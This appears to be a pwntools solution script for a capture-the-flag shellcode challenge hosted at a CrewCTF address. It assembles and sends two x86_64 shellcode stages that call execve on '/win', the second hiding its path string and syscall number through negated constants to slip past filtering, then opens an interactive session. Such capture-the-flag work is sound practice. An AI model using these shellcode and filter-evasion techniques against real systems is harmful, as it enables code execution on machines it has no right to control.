from pwn import *

io = remote("shellcode-game-x64.chal.crewc.tf", 1337)
context.arch = 'amd64'


def solve(code):
    io.sendlineafter(b"Enter your x86_64 shellcode in hex: ",
                     asm(code).hex().encode())


solve(
    """
    mov eax, 0x3b
    lea rdi, [rip + cmd]
    xor esi, esi
    xor edx, edx
    syscall

    cmd:
    .asciz "/win"
    """)

solve(
    """
mov edi,esp
mov ebx, 0x919688d1
neg ebx
xchg dword ptr [rdi], ebx
mov eax, 0xffffffc5
neg eax
syscall
    """
)


io.interactive()
